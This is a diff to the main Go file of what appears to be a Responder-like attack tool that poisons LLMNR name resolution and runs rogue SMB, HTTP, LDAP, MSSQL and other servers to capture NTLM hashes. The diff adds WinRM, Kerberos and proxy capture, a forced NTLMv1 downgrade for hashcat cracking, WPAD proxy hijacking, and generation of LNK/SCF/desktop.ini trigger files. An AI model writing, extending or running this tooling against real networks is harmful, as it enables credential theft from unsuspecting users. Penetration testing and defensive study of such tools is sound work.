@@ -10,8 +10,9 @@ import (
 )
 
 var (
-	verbose bool
-	outFile string
+	verbose   bool
+	outFile   string
+	ifaceName string // stored at startup for printStartup
 )
 
 const banner = `
@@ -28,22 +29,82 @@ const banner = `
 `
 
 func main() {
+	// Core
 	iface := flag.String("i", "", "Network interface to listen on (required)")
 	flag.BoolVar(&verbose, "v", false, "Verbose output")
 	flag.StringVar(&outFile, "o", "hashes.txt", "Output file for captured hashes")
-	challenge := flag.String("c", "", "Fixed NTLM challenge (hex, e.g. 1122334455667788). Random if not set.")
+	challenge := flag.String("c", "", "Fixed NTLM challenge (hex). Random if not set.")
 	analyze := flag.Bool("A", false, "Analyze mode: log queries but do not poison")
+
+	// Protocol disable flags
 	noSMB := flag.Bool("no-smb", false, "Disable SMB server")
 	noHTTP := flag.Bool("no-http", false, "Disable HTTP server")
+	noHTTPS := flag.Bool("no-https", false, "Disable HTTPS server")
 	noFTP := flag.Bool("no-ftp", false, "Disable FTP server")
 	noSMTP := flag.Bool("no-smtp", false, "Disable SMTP server")
 	noPOP3 := flag.Bool("no-pop3", false, "Disable POP3 server")
 	noIMAP := flag.Bool("no-imap", false, "Disable IMAP server")
 	noLDAP := flag.Bool("no-ldap", false, "Disable LDAP server")
-	noDNS := flag.Bool("no-dns", false, "Disable DNS server/poisoner")
+	noDNS := flag.Bool("no-dns", false, "Disable DNS server")
 	noDCERPC := flag.Bool("no-dcerpc", false, "Disable DCE-RPC server")
 	noMSSQL := flag.Bool("no-mssql", false, "Disable MSSQL server")
+	noWinRM := flag.Bool("no-winrm", false, "Disable WinRM server (port 5985)")
+	noKerberos := flag.Bool("no-kerberos", false, "Disable Kerberos AS-REQ capture (port 88)")
+	noProxy := flag.Bool("no-proxy", false, "Disable HTTP proxy NTLM capture (port 3128)")
+
+	// NTLM options
+	lm := flag.Bool("lm", false, "Force NTLMv1 by removing Extended Session Security flag (hashcat -m 5500)")
+
+	// WPAD
+	wpad := flag.Bool("wpad", false, "Enable WPAD PAC file serving from HTTP server")
+	wpadProxy := flag.String("wpad-proxy", "", "Proxy host:port to advertise in WPAD PAC file (default: self:3128)")
+
+	// Trigger file generation
+	lnkgen := flag.String("lnkgen", "", "Generate trigger files (SCF/URL/LNK/desktop.ini) in this directory and exit")
+
+	// Filtering (mirrors Responder -R/-r/-T/-N)
+	respondTo := flag.String("RespondTo", "", "Comma-separated IPs to respond to (all others ignored)")
+	flag.String("R", "", "Alias for --RespondTo")
+	dontRespondTo := flag.String("DontRespondTo", "", "Comma-separated IPs to never respond to")
+	flag.String("r", "", "Alias for --DontRespondTo")
+	respondToName := flag.String("RespondToName", "", "Comma-separated hostnames to respond to")
+	flag.String("T", "", "Alias for --RespondToName")
+	dontRespondToName := flag.String("DontRespondToName", "", "Comma-separated hostnames to never respond to")
+	flag.String("N", "", "Alias for --DontRespondToName")
+
 	flag.Parse()
+
+	// Resolve aliases
+	if v := flag.Lookup("R").Value.String(); v != "" && *respondTo == "" {
+		*respondTo = v
+	}
+	if v := flag.Lookup("r").Value.String(); v != "" && *dontRespondTo == "" {
+		*dontRespondTo = v
+	}
+	if v := flag.Lookup("T").Value.String(); v != "" && *respondToName == "" {
+		*respondToName = v
+	}
+	if v := flag.Lookup("N").Value.String(); v != "" && *dontRespondToName == "" {
+		*dontRespondToName = v
+	}
+
+	// Trigger file generation mode — generate and exit
+	if *lnkgen != "" {
+		if *iface == "" {
+			fmt.Fprintln(os.Stderr, "[-] -i <interface> required for --lnkgen")
+			os.Exit(1)
+		}
+		ip, err := getIfaceIP(*iface)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[-] Cannot get IP for interface %s: %v\n", *iface, err)
+			os.Exit(1)
+		}
+		if err := GenerateTriggerFiles(ip, *lnkgen); err != nil {
+			fmt.Fprintf(os.Stderr, "[-] lnkgen: %v\n", err)
+			os.Exit(1)
+		}
+		return
+	}
 
 	if *iface == "" {
 		fmt.Fprintln(os.Stderr, "[-] -i <interface> is required")
@@ -57,11 +118,22 @@ func main() {
 		os.Exit(1)
 	}
 
+	// Initialize
+	ifaceName = *iface
 	initSession(*challenge)
 	analyzeMode = *analyze
+	lmMode = *lm
+	wpadEnabled = *wpad
+	wpadProxyHost = *wpadProxy
+
+	// Set up IP/name filters
+	respondToIPs = parseIPList(*respondTo)
+	dontRespondIPs = parseIPList(*dontRespondTo)
+	respondToNames = parseNameList(*respondToName)
+	dontRespondNames = parseNameList(*dontRespondToName)
 
 	fmt.Print(banner)
-	printStartup(ip, *noSMB, *noHTTP, *noFTP, *noSMTP, *noPOP3, *noIMAP, *noLDAP, *noDNS, *noDCERPC, *noMSSQL)
+	printStartup(ip, *noSMB, *noHTTP, *noHTTPS, *noFTP, *noSMTP, *noPOP3, *noIMAP, *noLDAP, *noDNS, *noDCERPC, *noMSSQL, *noWinRM, *noKerberos, *noProxy)
 
 	// Poisoners
 	go poisonLLMNR(ip)
@@ -77,6 +149,9 @@ func main() {
 	}
 	if !*noHTTP {
 		go serveHTTP(ip)
+	}
+	if !*noHTTPS {
+		go serveHTTPS(ip)
 	}
 	if !*noFTP {
 		go serveFTP(ip)
@@ -99,8 +174,18 @@ func main() {
 	if !*noMSSQL {
 		go serveMSSQL(ip)
 	}
+	if !*noWinRM {
+		go serveWinRM(ip)
+	}
+	if !*noKerberos {
+		go serveKerberos(ip)
+	}
+	if !*noProxy {
+		go serveProxy(ip)
+	}
 
-	fmt.Println("[+] Listening for events...\n")
+	fmt.Println("[+] Listening for events...")
+	fmt.Println()
 
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
@@ -108,7 +193,7 @@ func main() {
 	fmt.Printf("\n[*] Shutting down. Hashes saved to %s\n", outFile)
 }
 
-func printStartup(ip net.IP, noSMB, noHTTP, noFTP, noSMTP, noPOP3, noIMAP, noLDAP, noDNS, noDCERPC, noMSSQL bool) {
+func printStartup(ip net.IP, noSMB, noHTTP, noHTTPS, noFTP, noSMTP, noPOP3, noIMAP, noLDAP, noDNS, noDCERPC, noMSSQL, noWinRM, noKerberos, noProxy bool) {
 	on := func(disabled bool) string {
 		if disabled {
 			return cRed + "OFF" + cReset
@@ -126,6 +211,7 @@ func printStartup(ip net.IP, noSMB, noHTTP, noFTP, noSMTP, noPOP3, noIMAP, noLDA
 	fmt.Printf("[+] Servers:\n")
 	fmt.Printf("    SMB server                 [%s]\n", on(noSMB))
 	fmt.Printf("    HTTP server                [%s]\n", on(noHTTP))
+	fmt.Printf("    HTTPS server               [%s]\n", on(noHTTPS))
 	fmt.Printf("    FTP server                 [%s]\n", on(noFTP))
 	fmt.Printf("    SMTP server                [%s]\n", on(noSMTP))
 	fmt.Printf("    POP3 server                [%s]\n", on(noPOP3))
@@ -133,14 +219,34 @@ func printStartup(ip net.IP, noSMB, noHTTP, noFTP, noSMTP, noPOP3, noIMAP, noLDA
 	fmt.Printf("    LDAP server                [%s]\n", on(noLDAP))
 	fmt.Printf("    MSSQL server               [%s]\n", on(noMSSQL))
 	fmt.Printf("    DCE-RPC server             [%s]\n", on(noDCERPC))
+	fmt.Printf("    WinRM server               [%s]\n", on(noWinRM))
+	fmt.Printf("    Kerberos server            [%s]\n", on(noKerberos))
+	fmt.Printf("    HTTP Proxy                 [%s]\n", on(noProxy))
 	fmt.Println()
 
 	fmt.Printf("[+] Generic Options:\n")
-	fmt.Printf("    Responder NIC              [%s]\n", flag.Lookup("i").Value.String())
+	fmt.Printf("    Responder NIC              [%s]\n", ifaceName)
 	fmt.Printf("    Responder IP               [%s]\n", ip)
 	fmt.Printf("    Challenge set              [%s]\n", challengeHexStr())
+	fmt.Printf("    LM downgrade               [%v]\n", lmMode)
 	fmt.Printf("    Analyze mode               [%v]\n", analyzeMode)
+	if wpadEnabled {
+		fmt.Printf("    WPAD                       [ON — proxy %s]\n", wpadProxyHost)
+	}
 	fmt.Println()
+
+	if len(respondToIPs) > 0 {
+		fmt.Printf("[+] RespondTo filter:         %v\n", respondToIPs)
+	}
+	if len(dontRespondIPs) > 0 {
+		fmt.Printf("[+] DontRespondTo filter:     %v\n", dontRespondIPs)
+	}
+	if len(respondToNames) > 0 {
+		fmt.Printf("[+] RespondToName filter:     %v\n", respondToNames)
+	}
+	if len(dontRespondNames) > 0 {
+		fmt.Printf("[+] DontRespondToName filter: %v\n", dontRespondNames)
+	}
 
 	fmt.Printf("[+] Current Session Variables:\n")
 	fmt.Printf("    Responder Machine Name     [%s]\n", sessionMachineName)
